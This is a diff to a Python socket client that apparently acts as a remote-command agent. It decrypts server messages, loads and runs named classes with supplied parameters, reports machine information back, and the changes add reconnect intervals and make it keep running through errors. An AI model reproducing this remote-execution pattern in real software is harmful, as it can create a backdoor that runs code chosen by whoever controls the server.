@@ -9,6 +9,8 @@ import xml.etree.ElementTree as ET
 
 SERVER_IP = '127.0.0.1'
 SERVER_PORT = 5000
+INTERVAL_INFO = 1
+INTERVAL_RECONN = 1
 
 g_bConnected = False
 
@@ -467,6 +469,7 @@ class Client:
         self.szChallenge = None
 
         self.dic_class = dict()
+        self.dic_class['INTERVAL_INFO'] = INTERVAL_INFO
 
     def send(self, nCmd: int, nParam: int, szMsg: str):
         buffer = C2P(nCmd=nCmd, nParam=nParam, abData=szMsg.encode('ascii')).get_buffer()
@@ -500,6 +503,8 @@ def combine_bytes(abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: byte
     return abFirst[nIdxFirst:nIdxFirst + nLenFirst] + abSecond[nIdxSecond:nIdxSecond + nLenSecond]
 
 def handler(clnt_sock: socket.socket):
+    global g_bConnected
+
     abStaticRecv = b''
     abDynamicRecv = b''
 
@@ -539,7 +544,7 @@ def handler(clnt_sock: socket.socket):
 
                         if nCmd == 0:
                             if nParam == 0:
-                                pass
+                                exit()
                             elif nParam == 1:
                                 def send_lattency():
                                     time.sleep(1)
@@ -572,7 +577,6 @@ def handler(clnt_sock: socket.socket):
 
                                 clnt.send(1, 4, sz_b64_resp)
                         elif nCmd == 2:
-                            #abMsg = Encoder.b64str2bytes(abMsg.decode('utf-8'))
                             abMsg = base64.b64decode(abMsg)
                             szDecMsg = clnt.pAES.decrypt_cbc(abMsg).decode('utf-8')
                             
@@ -580,7 +584,7 @@ def handler(clnt_sock: socket.socket):
                                 clnt.sendcipher(2, 1, g_szTag)
                             elif nParam == 2: # Send machine information.
                                 aMsg = [base64.b64decode(x).decode('utf-8') for x in szDecMsg.split('|')]
-                                print(aMsg)
+
                                 szToken = aMsg[0]
                                 szClassName = aMsg[1]
                                 szClassStr = aMsg[2]
@@ -592,36 +596,40 @@ def handler(clnt_sock: socket.socket):
                                     clnt.dic_class[szClassName] = clnt.dic_class[szClassName]()
 
                                 def foo():
-                                    objClass = clnt.dic_class[szClassName]
-                                    if not hasattr(objClass, 'run'):
-                                        return
-                                    
-                                    ret_val = objClass.run(clnt, szToken, aParam)
+                                    try:
+                                        objClass = clnt.dic_class[szClassName]
+                                        if not hasattr(objClass, 'run'):
+                                            return
+                                        
+                                        ret_val = objClass.run(clnt, szToken, aParam)
 
-                                    if ret_val == None:
-                                        return
+                                        if ret_val == None:
+                                            return
 
-                                    assert isinstance(ret_val, list)
+                                        assert isinstance(ret_val, list)
 
-                                    ret_val.insert(0, szToken)
+                                        ret_val.insert(0, szToken)
 
-                                    clnt.sendserver(ret_val)
+                                        clnt.sendserver(ret_val)
+
+                                    except OSError as ex:
+                                        if ex.errno == 9:
+                                            clnt_sock.close()
+                                            global g_bConnected
+                                            g_bConnected = False
                                 
                                 threading.Thread(target=foo, args=[]).start()
 
                     except Exception as ex:
-                        break
+                        continue
 
         except Exception as ex:
-            break
+            continue
 
     clnt_sock.close()
     clnt = None
 
-    global g_bConnected
     g_bConnected = False
-    
-    return
 
 def connect(sock: socket.socket):
     global g_bConnected
